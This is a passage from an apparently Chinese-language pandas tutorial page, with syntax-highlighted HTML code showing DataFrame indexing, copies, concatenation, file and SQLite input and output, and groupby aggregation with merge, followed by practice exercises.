punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 对元素索引</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'张三'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'张三'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>张三<span class="token punctuation">)</span><span class="token comment"># 直接用中括号切片,[行切片,列切片]</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span>size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'小芳'</span><span class="token punctuation">,</span><span class="token string">'小花'</span><span class="token punctuation">,</span><span class="token string">'小红'</span><span class="token punctuation">,</span><span class="token string">'小蔡'</span><span class="token punctuation">]</span>indexs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">,</span><span class="token string">'英语'</span><span class="token punctuation">,</span><span class="token string">'思想品德'</span><span class="token punctuation">,</span><span class="token string">'社会'</span><span class="token punctuation">]</span>df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> data<span class="token punctuation">,</span> columns <span class="token operator">=</span> columns<span class="token punctuation">,</span> index <span class="token operator">=</span> indexs<span class="token punctuation">)</span><span class="token comment"># 索引</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'小花'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 赋值</span>df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'小明'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">100</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 求平均值</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'社会'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'小花'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 副本</span>xiaoming <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'小明'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>xiaoming<span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'小明'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'小花'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>特别注意！这个细节很深</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'item'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'苹果'</span><span class="token punctuation">,</span><span class="token string">'香蕉'</span><span class="token punctuation">,</span><span class="token string">'橘子'</span><span class="token punctuation">,</span><span class="token string">'香蕉'</span><span class="token punctuation">,</span><span class="token string">'橘子'</span><span class="token punctuation">,</span><span class="token string">'苹果'</span><span class="token punctuation">,</span><span class="token string">'苹果'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token string">'price'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2.8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'yello'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 不能改变原数据，因为df.iloc[0]首先获取了第一行的一个副本，然后在副本上进行操作</span>df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'weight'</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>NAN<span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 可以改变原数据</span>df<span class="token punctuation">[</span><span class="token string">'weight'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>NAN<span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-DataFrame的级联"><a href="#3-DataFrame的级联" class="headerlink" title="3.DataFrame的级联"></a>3.DataFrame的级联</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">n1 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>df1 <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">)</span>n2 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>df2 <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>n2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df2<span class="token punctuation">)</span>df3 <span class="token operator">=</span> pd<span class="token punctuation">.</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span>df1<span class="token punctuation">,</span>df2<span class="token punctuation">)</span><span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df3<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、Pandas文件读写"><a href="#三、Pandas文件读写" class="headerlink" title="三、Pandas文件读写"></a>三、Pandas文件读写</h2><h3 id="1-读取"><a href="#1-读取" class="headerlink" title="1.读取"></a>1.读取</h3><p>pandas提供了一些用于将表格型数据读取为DataFrame对象的函数，期中read_csv和read_table这两个使用最多</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">file</span> <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">"movie_data.csv"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">file</span> <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_json<span class="token punctuation">(</span><span class="token string">'movie_data.json'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># sheet_name可以指定工作表</span><span class="token builtin">file</span> <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">'movie_data.xlsx'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong>如果读出来乱码，可能是编码问题，可选参数 <code>encoding</code>，常用编码<code>utf-8</code></p><h3 id="2-写入"><a href="#2-写入" class="headerlink" title="2. 写入"></a>2. 写入</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span>size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> data<span class="token punctuation">,</span>columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span><span class="token string">'c++'</span><span class="token punctuation">,</span><span class="token string">'oc'</span><span class="token punctuation">,</span><span class="token string">'java'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># index默认为True，会默认把行索引也写入到文件</span>df<span class="token punctuation">.</span>to_excel<span class="token punctuation">(</span><span class="token string">'score.xlsx'</span><span class="token punctuation">,</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意点</strong></p><p>在以下的案例中，<code>pd.read_csv</code> 在读取的时候给我们又重新生成一个从 0 开始的整数索引，但是我们并不需要新的index，我们就希望存进去的时候什么样，读出来就什么样，你可以通过<code>index_col</code>指定哪一列为index。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> pandas <span class="token keyword">import</span> Series<span class="token punctuation">,</span>DataFramedata <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'张三'</span><span class="token punctuation">,</span><span class="token string">'李四'</span><span class="token punctuation">]</span>indexs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">,</span><span class="token string">'英语'</span><span class="token punctuation">,</span><span class="token string">'理综'</span><span class="token punctuation">]</span>df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> data<span class="token punctuation">,</span>columns <span class="token operator">=</span> columns<span class="token punctuation">,</span>index <span class="token operator">=</span> indexs<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span>df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'123.csv'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token builtin">file</span> <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'123.csv'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span>index_col<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-读写sqlite文件"><a href="#3-读写sqlite文件" class="headerlink" title="3.读写sqlite文件"></a>3.读写sqlite文件</h3><ul><li>vscode可以安装sqlite插件</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sqlite3 <span class="token keyword">as</span> sqlite3<span class="token comment"># 跟数据库建立连接</span>connection <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'./db.sqlite'</span><span class="token punctuation">)</span><span class="token comment"># 读取数据库文件</span>data <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_sql<span class="token punctuation">(</span><span class="token string">"select* from movie_data"</span><span class="token punctuation">,</span>connection<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 写入数据库</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>to_sql<span class="token punctuation">(</span><span class="token string">"score_data"</span><span class="token punctuation">,</span>connection<span class="token punctuation">,</span>if_exists<span class="token operator">=</span><span class="token string">"replace"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、pandas数据处理"><a href="#四、pandas数据处理" class="headerlink" title="四、pandas数据处理"></a>四、pandas数据处理</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> pandas <span class="token keyword">import</span> Series<span class="token punctuation">,</span>DataFrame<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="分组聚合"><a href="#分组聚合" class="headerlink" title="分组聚合"></a>分组聚合</h3><p>数据聚合是数据处理的最后一步，通常是要使每一个数组生成一个单一的数值。<br>数据分类处理：</p><ul><li>分组：先把数据分为几组</li><li>用函数处理：为不同组的数据应用不同的函数以转换数据</li><li>合并：把不同组得到的结果合并起来</li></ul><p>数据分类处理的核心：</p><ul><li>groupby()函数</li><li>groups属性查看分组情况</li></ul><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>min()</td><td>最小值</td></tr><tr><td>max()</td><td>最大值</td></tr><tr><td>std()</td><td>标准差</td></tr><tr><td>mean()</td><td>平均值</td></tr><tr><td>median()</td><td>中位数</td></tr><tr><td>sum()</td><td>总和</td></tr><tr><td>count()/size()</td><td>数量</td></tr><tr><td>value_count()</td><td>频数分布</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python">grade_df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'班级'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                         <span class="token string">'性别'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                         <span class="token string">'眼镜'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                         <span class="token string">'成绩'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>grade_df<span class="token punctuation">)</span><span class="token comment"># 单层分组聚合</span><span class="token comment"># 对班级进行分组聚合操作</span><span class="token comment">#                     分组操作          聚合操作</span>grade_df1 <span class="token operator">=</span> grade_df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'班级'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'成绩'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>grade_df1<span class="token punctuation">)</span><span class="token comment"># 多分层分组聚合</span>grade_df3 <span class="token operator">=</span> grade_df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'班级'</span><span class="token punctuation">,</span> <span class="token string">'性别'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'成绩'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>grade_df3<span class="token punctuation">)</span>grade_df4 <span class="token operator">=</span> grade_df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'性别'</span><span class="token punctuation">,</span> <span class="token string">'班级'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'成绩'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>grade_df4<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'item'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'苹果'</span><span class="token punctuation">,</span><span class="token string">'香蕉'</span><span class="token punctuation">,</span><span class="token string">'橘子'</span><span class="token punctuation">,</span><span class="token string">'香蕉'</span><span class="token punctuation">,</span><span class="token string">'橘子'</span><span class="token punctuation">,</span><span class="token string">'苹果'</span><span class="token punctuation">,</span><span class="token string">'苹果'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token string">'price'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2.8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token string">'yello'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 可以通过groups属性查看分组情况，但是不要企图用DataFrame的方式展示数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'item'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">)</span><span class="token comment"># 一般是进行聚合操作处理后在查看结果，这里展示查看总和的聚合操作</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'item'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 对weight求总和</span>weight_sum <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'item'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'weight'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>weight_sum<span class="token punctuation">)</span><span class="token comment"># 求价格的平均值</span>price_mean <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'item'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>price_mean<span class="token punctuation">)</span><span class="token comment"># 把总和跟df进行merge合并</span><span class="token comment"># 'left_on'和'right_on'指定了左侧和右侧数据框中用于连接的列</span>result1 <span class="token operator">=</span> pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>df<span class="token punctuation">,</span>weight_sum<span class="token punctuation">,</span>how<span class="token operator">=</span><span class="token string">'outer'</span><span class="token punctuation">,</span>left_on<span class="token operator">=</span><span class="token string">'item'</span><span class="token punctuation">,</span>right_on<span class="token operator">=</span><span class="token string">'item'</span><span class="token punctuation">,</span>suffixes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'_total'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result1<span class="token punctuation">)</span> <span class="token comment"># 把平均价格合并到总表里</span>result2 <span class="token operator">=</span> pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>result1<span class="token punctuation">,</span>price_mean<span class="token punctuation">,</span>how<span class="token operator">=</span><span class="token string">'outer'</span><span class="token punctuation">,</span>left_on<span class="token operator">=</span><span class="token string">'item'</span><span class="token punctuation">,</span>right_index<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>suffixes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'_mean'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用列表进行多列分组，得到的结果是多层级索引</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'item'</span><span class="token punctuation">,</span><span class="token string">'color'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'weight'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>练习：</strong></p><ol><li><p>以属性为列索引，创建一个DataFrame对象df  </p></li><li><p>对df进行聚合操作，求出颜色为绿色的价格总和</p></li><li><p>对df进行聚合操作，求出萝卜的所有重量(包括白萝卜，胡萝卜，青萝卜）以及平均价格</p></li><li><p>使用merge合并总重量及平均价格</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">df1 <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'item'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'萝卜'</span><span class="token punctuation">,</span><span class="token 